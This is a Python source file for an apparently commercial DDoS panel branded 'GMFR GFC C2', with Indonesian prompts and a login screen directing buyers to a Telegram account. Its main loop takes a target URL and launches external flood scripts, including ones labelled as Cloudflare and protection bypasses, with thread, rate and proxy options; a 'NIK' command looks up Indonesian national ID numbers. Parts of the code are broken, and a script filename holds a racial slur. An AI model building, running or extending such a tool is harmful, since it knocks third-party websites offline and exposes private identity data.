# FIXXED BY @GMFR444
from operator import index
import socket
import os
import requests
import random
import getpass
import time
import sys
from colorama import Fore, Back
import os,sys,time,re,requests,json
from requests import post
import codecs
import string
import urllib
import getpass

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''
HALLO WELCOME TO GFC TEAM''')
    time.sleep(0.6)
    clear()
    print(f'''
MOHON TUNGGU SEBENTAR...''')
    time.sleep(0.6)
    clear()
    print(f'''
LOADING⏳''')
    time.sleep(0.6)
    clear()
    print(f"""
SUCCES✅""")
    time.sleep(0.8)
    clear()

def si():
    print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mGMFR OFFC \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to GFC TEAM DDOS \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: GMFR GFC C2 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.3')
    print("")

def TLZDDOS():
	os.system ("clear")
	print("""
                                  ⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷⠀⠀⠘⠉⠛⢻⣷⣿⣽⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠠⣿⣿⡟⢻⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣿⡾⣿⣿⣿⣿⣿⠿⣻⣿⣿⡀⠀⠀⠀⢻⣿⣷⡀⠻⣧⣿⠆⠀⠀⠀⠀⣿⣿⣿⡻⣿⣿⣿⣿⣿⠿⣽⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠟⣩⣾⣿⣿⣿⢟⣵⣾⣿⣿⣿⣧⠀⠀⠀⠈⠿⣿⣿⣷⣈⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣮⣟⢯⣿⣿⣷⣬⡻⣷⡄⠀⠀⠀
⠀⠀⢀⡜⣡⣾⣿⢿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⣄⠀⣰⣿⣿⣿⣿⣿⣷⣄⠀⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄⠀⠀
⠀⢠⢟⣿⡿⠋⣠⣾⢿⣿⣿⠟⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝⣆⠀
⠀⢯⣿⠏⣠⠞⠋⠀⣠⡿⠋⢀⣿⠁⢸⡏⣿⠿⣿⣿⠃⢠⣴⣾⣿⣿⡟⠀⠘⢹⣿⠟⣿⣾⣷⠈⣿⡄⠘⢿⣦⠀⠈⠻⣆⠙⣿⣜⠆
⢀⣿⠃⡴⠃⢀⡠⠞⠋⠀⠀⠼⠋⠀⠸⡇⠻⠀⠈⠃⠀⣧⢋⣼⣿⣿⣿⣷⣆⠀⠈⠁⠀⠟⠁⡟⠀⠈⠻⠀⠀⠉⠳⢦⡀⠈⢣⠈⢿⡄
⣸⠇⢠⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠋⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢾⣆⠈⣷
⡟⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⡀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⢹
⡇⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⣿⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⢸
⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠶⣶⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼
⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣼⣀⣠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

\033[37m[ TLZDDOS ]
\033[35mNOTE USE:
METHODE [URL]

\033[37m
 – TLZDDOS_SRV1 [URL]
 – TLZDDOS_SRV2 [URL]

""")

def L7():
	os.system ("clear")
	print("""
                         ⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷⠀⠀⠘⠉⠛⢻⣷⣿⣽⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠠⣿⣿⡟⢻⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣿⡾⣿⣿⣿⣿⣿⠿⣻⣿⣿⡀⠀⠀⠀⢻⣿⣷⡀⠻⣧⣿⠆⠀⠀⠀⠀⣿⣿⣿⡻⣿⣿⣿⣿⣿⠿⣽⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠟⣩⣾⣿⣿⣿⢟⣵⣾⣿⣿⣿⣧⠀⠀⠀⠈⠿⣿⣿⣷⣈⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣮⣟⢯⣿⣿⣷⣬⡻⣷⡄⠀⠀⠀
⠀⠀⢀⡜⣡⣾⣿⢿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⣄⠀⣰⣿⣿⣿⣿⣿⣷⣄⠀⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄⠀⠀
⠀⢠⢟⣿⡿⠋⣠⣾⢿⣿⣿⠟⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝⣆⠀
⠀⢯⣿⠏⣠⠞⠋⠀⣠⡿⠋⢀⣿⠁⢸⡏⣿⠿⣿⣿⠃⢠⣴⣾⣿⣿⡟⠀⠘⢹⣿⠟⣿⣾⣷⠈⣿⡄⠘⢿⣦⠀⠈⠻⣆⠙⣿⣜⠆
⢀⣿⠃⡴⠃⢀⡠⠞⠋⠀⠀⠼⠋⠀⠸⡇⠻⠀⠈⠃⠀⣧⢋⣼⣿⣿⣿⣷⣆⠀⠈⠁⠀⠟⠁⡟⠀⠈⠻⠀⠀⠉⠳⢦⡀⠈⢣⠈⢿⡄
⣸⠇⢠⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠋⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢾⣆⠈⣷
⡟⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⡀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⢹
⡇⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⣿⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⢸
⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠶⣶⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼
⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣼⣀⣠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[37m[ GMFR ]
\033[35mNOTE USE:
METHODE [URL]
CONTOH :
\033[37mMETHOD : GET/POST

\033[37m
 – XCDDOS [URL] [METHOD] [VVIP]
 – STRIKE [URL] [GET] [VVIP]
 – BROWSER [URL] [THREAD] [get/post] [second] [header.txt/nil] [VVIP]
 – HTTP-RAND [URL]] [TIME]
 – HTTPS-STORM [URL] [THREAD] [get/post] [second] [header.txt/nil] [VVIP]
 – UAM [URL] [TIME] [RATE] [THREAD] [PROXY]
 – TLS-CF [URL] [TIME] [THREAD] [PROXY] [VVIP]
 – BYPASS [URL] [TIME] [RATE] [THREAD] [PROXY]
 – TLSV2 [URL] [TIME] [RPS] [THREAD]
 – NOVA [URL] [TIME] [RATE] [THREAD] [PROXY] [VVIP]
 – TLZ [URL] [GET] [VVIP]
 – SOCKET [URL] [METHOD] [VVIP]
 – ZOXCV2 [URL] [RPS] [THREAD] [VVIP]
 – BOMB2 [URL] [METHOD]
 – BOMB3 [URL] [METHOD]
 – NULL [URL] [THREAD] [get/post] [second] [header.txt/nil] [VVIP]
 – GEO [URL] [TIME] [RPS] [THERDS] [PROXY] [VVIP]
 – CTA [URL] [METHOD]
 – NIK [NIK] 
 – TEMP [CodeNegara] 
""")

def menu():
    sys.stdout.write(f"         \x1b]2;GMFR GFC C2 --> Stars: [{bots}] | Online Users: [500] | Methods: [35] | Bypass: [29] | Amps: [14]\x07")
    clear()
    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mGMFR GFC \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to GMFR GFC C2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: @GMFR444X \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.3')
    print("")
    print("""
⠀⠀⠀.                   
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷⠀⠀⠘⠉⠛⢻⣷⣿⣽⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠠⣿⣿⡟⢻⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣿⡾⣿⣿⣿⣿⣿⠿⣻⣿⣿⡀⠀⠀⠀⢻⣿⣷⡀⠻⣧⣿⠆⠀⠀⠀⠀⣿⣿⣿⡻⣿⣿⣿⣿⣿⠿⣽⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠟⣩⣾⣿⣿⣿⢟⣵⣾⣿⣿⣿⣧⠀⠀⠀⠈⠿⣿⣿⣷⣈⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣮⣟⢯⣿⣿⣷⣬⡻⣷⡄⠀⠀⠀
⠀⠀⢀⡜⣡⣾⣿⢿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⣄⠀⣰⣿⣿⣿⣿⣿⣷⣄⠀⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄⠀⠀
⠀⢠⢟⣿⡿⠋⣠⣾⢿⣿⣿⠟⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝⣆⠀
⠀⢯⣿⠏⣠⠞⠋⠀⣠⡿⠋⢀⣿⠁⢸⡏⣿⠿⣿⣿⠃⢠⣴⣾⣿⣿⡟⠀⠘⢹⣿⠟⣿⣾⣷⠈⣿⡄⠘⢿⣦⠀⠈⠻⣆⠙⣿⣜⠆
⢀⣿⠃⡴⠃⢀⡠⠞⠋⠀⠀⠼⠋⠀⠸⡇⠻⠀⠈⠃⠀⣧⢋⣼⣿⣿⣿⣷⣆⠀⠈⠁⠀⠟⠁⡟⠀⠈⠻⠀⠀⠉⠳⢦⡀⠈⢣⠈⢿⡄
⣸⠇⢠⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠋⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢾⣆⠈⣷
⡟⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⡀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⢹
⡇⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⣿⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⢸
⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠶⣶⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼
⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣼⣀⣠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


\x1b[1;37mᴘʟᴇᴀsᴇ ᴛʏᴘᴇ " HELP " ᴛᴏ sᴇᴇ ᴀʟʟ ᴛʜᴇ ᴍᴇᴛʜᴏᴅs.
""")

def main():
    menu()
    while(True):
        cnc = input("root@GFCPANEL:~# \x1b[1;37m\033[0m ")
        if cnc == "TLZ" or cnc == "tlz":
            TLZDDOS()
        elif cnc == "L7" or cnc == "l7":
            L7()

# LAYER 7 METHODS

        elif "TLZDDOS_SRV1" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                
                os.system(f'go run TLZDDOS.go -url {url} POST')
            except IndexError:
                print('Usage: TLZDDOS_SRV1 <url>')
                print('Example: TLZDDOS_SRV1 https://example.com POST')
                
        elif "TLZDDOS_SRV2" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                
                os.system(f'go run TLZDDOS.go -url {url} GET')
            except IndexError:
                print('Usage: TLZDDOS_SRV2 <url> <method> GET')
                print('Example: TLZDDOS_SRV2 https://example.com GET')
                
        elif "XCDDOS" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                
                os.system(f'go run XCDDOS.go -url {url} get')
            except IndexError:
                print('Usage: XCDDOS <url>')
                print('Example: XCDDOS https://example.com')
               
        elif "NIK" in cnc:
            try:
                nik = cnc.split()[1]
                
                os.system(f'nik-parse  -n {nik}')
            except IndexError:
                print('Usage: NIK <nik>')
                print('Example: NIK 9298293293')
                
        elif "TEMP" in cnc:
            try:
                url = cnc.split()[1]
                nik = cnc.split()[2]
                               
                os.system(f'node index.js {url} 62')
            except IndexError:
                print('Usage: TEMP 62')
                print('Example: TEMP 62')
                                  
        elif "STRIKE" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                
                os.system(f'go run strike.go -url {url} GET')
            except IndexError:
                print('Usage: strike <url> <method> GET')
                print('Example: strike https://example.com GET')

        elif "TLZ" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                
                os.system(f'go run TLZ.go -url {url} GET')
            except IndexError:
                print('Usage: TLZ <url> <method> GET')
                print('Example: TLZ https://example.com')

        elif "ZOXCV2" in cnc:
            try:
                url = cnc.split()[1]
                rps = cnc.split()[2]
                thread = cnc.split()[3]
                
                os.system(f'go run zoxcv2.go {url} {rps} {thread}')
            except IndexError:
                print('Usage: ZOXCV2 <url> <rps> <thread>')
                print('Example: ZOXCV2 https://example.com 50 1000')
                       
        elif "HTTPS-STORM" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                second = cnc.split()[4]
                proxy = cnc.split()[5]
                os.system(f'go run HTTPS-STORM.go {url} {thread} {method} {second} {proxy}')
            except IndexError:
                print('Usage: HTTPS-STORM <url> <threads> <get/post> <seconds> <header.txt/nil')
                print('Example: HTTPS-STORM https://example.com 500 <get/post> 125 <header.txt/nil')
        
        elif "BROWSER" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                second = cnc.split()[4]
                proxy = cnc.split()[5]
                os.system(f'go run BROWSER.go {url} {thread} {method} {second} {proxy}')
            except IndexError:
                print('Usage: BROWSER <url> <threads> <get/post> <seconds> <header.txt/nil')
                print('Example: BROWSER https://example.com 500 <get/post> 125 <header.txt/nil')
                
        elif "NULL" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                second = cnc.split()[4]
                proxy = cnc.split()[5]
                os.system(f'go run Null.go {url} {thread} {method} {second} {proxy}')
            except IndexError:
                print('Usage: NULL <url> <threads> <get/post> <seconds> <header.txt/nil')
                print('Example: NULL https://example.com 500 <get/post> 125 <header.txt/nil')
                        
        elif "HTTP-RAND" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print('Usage: HTTP-RAND <url> <time>')
                print('Example: HTTP-RAND https://example.com 500')
 
        elif "Tls" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]
                
                os.system(f'node Tlsv1 {url} {time} {time}')
            except IndexError:
                print('Usage: Tls <url> <time> <rps> <threads> <proxies.txt>')
                print('Example: Tls http://example.com 60 5000 500 proxies.txt')

        elif "SOCKET" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                
                os.system(f'go run SOCKET.go -site {url} -data POST')
            except IndexError:
                print('Usage: SOCKET <url> <method>')
                print('Example: SOCKET https://example.com')

        elif "BOMB2" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]

                os.system(f'go run Hulk.go -site {url} -data POST')
            except IndexError:
                print('Usage: BOMB2 <url> <method>')
                print('Example: BOMB2 https://example.com')

        elif "BOMB3" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]

                os.system(f'go run Low.go -site {url} -data POST')
            except IndexError:
                print('Usage: BOMB3 <url> <method>')
                print('Example: BOMB3 https://example.com')
                
        elif "GEO" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]

                os.system(f'node GEO.js {url} {time} {rps} {thread} {proxy}')
            except IndexError:
                print('Usage: GEO <url> <time> <rps> <threads> <proxy.txt>')
                print('Example: GEO http://example.com 60 5000 500 proxy.txt')

        elif "CTA" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]

                os.system(f'go run CTA.go -site {url} -data GET')
            except IndexError:
                print('Usage: CTA <url> <method>')
                print('Example: CTA https://example.com')
                
        elif "TLSV2" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]
                
                os.system(f'node tlsv2  {url} {time} {rps} {thread}')
            except IndexError:
                print('Usage: tlsv2 <url> <time> <rps> <threads> <proxy.txt>')
                print('Example: tlsv2 http://example.com 60 5000 500 proxy.txt')
                
        elif "BOMB" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                rps = cnc.split()[4]
                proxy = cnc.split()[5]
                os.system(f'node BOOMBER.js {url} {time} {thread} {rps} {proxy}')
            except IndexError:
                print('Usage: BOMB <url> <time> <thread> <rps> <proxy ')
                print('Example: BOMB https://example.com 60 10 50 http.txt')
               
        elif "UAM" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rate = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]
                os.system(f'node UAM.js {url} {time} {rate} {thread} {proxy}')
            except IndexError:
                print('Usage: UAM <url> <time> <rate> <thread> <proxy> ')
                print('Example: UAM https://example.com 60 10 50 proxies.txt')
                
        elif "TLS-CF" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]
                os.system(f'node TLSCLF.js {url} {time} {rps} {thread} {proxy}')
            except IndexError:
                print('Example: TLS-CF https://example.com 60 32 10 proxy.txt')
                
        elif "BYPASS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]
                os.system(f'node BYPASS.js {url} {time} {rate} {thread} {proxy}')
            except IndexError:
                print('Example: node bypass.js target time rate(32) thread proxies.txt')
                
        elif "NOVA" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]
                os.system(f'node novaria.js {url} {time} {rate} {thread} {proxy}')
            except IndexError:
                print('Example: node novaria.js target time rate(32) thread proxies.txt')
                

        elif "MODULES-UPDATE" in cnc:
            try:
                os.system(f'node node_auto_install_modules.js HTTP-NIGGA.js 404.js anus.js MIX.js BYPASS.js')
            except IndexError:
                print('Usage: MODULES-UPDATE')
                print('Example: MODULES-UPDATE')	    

        elif "help" in cnc:
            print(f'''
LS -> LAYER 7
TLZ -> TLZ LAYER 7
L7-> GFC LAYER 7 \33[0;35mNEW
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    os.system("clear")
    user = ""
    passwd = ""
    username = input("""





    
                
                           ⚡ \33[0;32mLOGIN TO DDOS : """)
    password = getpass.getpass(prompt="""                  
                           ⚡ \33[0;32mPASSWORDS       : """)
    if username != user or password != passwd:
        print("")
        print(f"""        
                              ☠️ \033[1;31;40mBUY YA DEKS t.me/GMFR444X""")
        time.sleep(0.6)
        sys.exit(1)
    elif username == user and password == passwd:
        print("""                                              
                         ⚡ \33[0;32mWELLCOME TO DDOS""")
        time.sleep(0.3)
    menu()
    main()
    

login()